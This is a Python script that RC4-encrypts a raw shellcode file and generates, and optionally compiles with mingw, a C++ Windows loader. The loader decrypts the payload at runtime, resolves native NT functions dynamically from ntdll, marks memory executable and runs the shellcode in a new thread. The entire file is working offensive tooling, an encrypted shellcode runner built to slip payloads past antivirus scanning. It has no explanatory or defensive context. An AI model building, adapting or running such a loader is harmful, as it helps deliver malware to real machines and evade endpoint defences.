import argparse
import subprocess

def rc4_encrypt(data: bytes, key: str) -> bytes:
    key_bytes = key.encode()
    S = list(range(256))
    j = 0
    out = bytearray()

    for i in range(256):
        j = (j + S[i] + key_bytes[i % len(key_bytes)]) % 256
        S[i], S[j] = S[j], S[i]


    i = j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) % 256])

    return bytes(out)
def generate_cpp_rc4(encrypted_shellcode: bytes, key: str, output_file: str = "rc4_runner.cpp"):
    hex_shellcode = ", ".join(f"0x{b:02x}" for b in encrypted_shellcode)
    key_bytes = ", ".join(str(ord(c)) for c in key)
    key_len = len(key)

    cpp_code = f"""
#include <windows.h>
#include <iostream>
#include <vector>
#include <cstring>

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

unsigned char encrypted_shellcode[] = {{
    {hex_shellcode}
}};

unsigned char key[] = {{
    {key_bytes}
}};

void rc4_decrypt(unsigned char* data, size_t data_len, unsigned char* key, size_t key_len) {{
    unsigned char S[256];
    for (int i = 0; i < 256; ++i) S[i] = i;

    int j = 0;
    for (int i = 0; i < 256; ++i) {{
        j = (j + S[i] + key[i % key_len]) % 256;
        std::swap(S[i], S[j]);
    }}

    int i = 0;
    j = 0;
    for (size_t n = 0; n < data_len; ++n) {{
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        std::swap(S[i], S[j]);
        int k = S[(S[i] + S[j]) % 256];
        data[n] ^= k;
    }}
}}

int main() {{
    SIZE_T shellcode_len = sizeof(encrypted_shellcode);

    rc4_decrypt(encrypted_shellcode, shellcode_len, key, {key_len});

    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (!ntdll) {{
        std::cerr << "[-] Failed to load ntdll.dll\\n";
        return -1;
    }}

    auto NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    auto NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(ntdll, "NtProtectVirtualMemory");
    auto NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(ntdll, "NtCreateThreadEx");

    if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory || !NtCreateThreadEx) {{
        std::cerr << "[-] Failed to resolve NTAPI functions\\n";
        return -1;
    }}

    PVOID base = nullptr;
    SIZE_T region_size = shellcode_len;

    if (NtAllocateVirtualMemory((HANDLE)-1, &base, 0, &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {{
        std::cerr << "[-] NtAllocateVirtualMemory failed\\n";
        return -1;
    }}

    memcpy(base, encrypted_shellcode, shellcode_len);

    ULONG oldProtect;
    if (NtProtectVirtualMemory((HANDLE)-1, &base, &region_size, PAGE_EXECUTE_READ, &oldProtect)) {{
        std::cerr << "[-] NtProtectVirtualMemory failed\\n";
        return -1;
    }}

    HANDLE hThread = NULL;
    if (NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, base, NULL, FALSE, 0, 0, 0, NULL)) {{
        std::cerr << "[-] NtCreateThreadEx failed\\n";
        return -1;
    }}

    WaitForSingleObject(hThread, INFINITE);
    return 0;
}}
"""
    with open(output_file, "w") as f:
        f.write(cpp_code)
    print(f"[+] RC4-based C++ runner saved to {output_file}")

def compile_cpp(cpp_file: str, exe_name: str = "runner.exe"):
    print(f"[*] Compiling {cpp_file} to {exe_name}...")
    try:
        subprocess.run([
            "x86_64-w64-mingw32-g++", cpp_file,
            "-o", exe_name,
            "-static", "-lntdll"
        ], check=True)
        print(f"[+] Compilation successful: {exe_name}")
    except subprocess.CalledProcessError:
        print("[!] Compilation failed. Do you have mingw-w64 installed?")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("shellcode_file", help="Path to raw .bin shellcode file")
    parser.add_argument("key", help="RC4 encryption key")
    parser.add_argument("--compile", action="store_true", help="Compile the resulting C++ file to EXE")
    parser.add_argument("--output", default="rc4_runner.cpp", help="Output C++ file name")
    args = parser.parse_args()

    with open(args.shellcode_file, "rb") as f:
        raw_shellcode = f.read()

    encrypted = rc4_encrypt(raw_shellcode, args.key)
    generate_cpp_rc4(encrypted, args.key, output_file=args.output)

    if args.compile:
        compile_cpp(args.output)
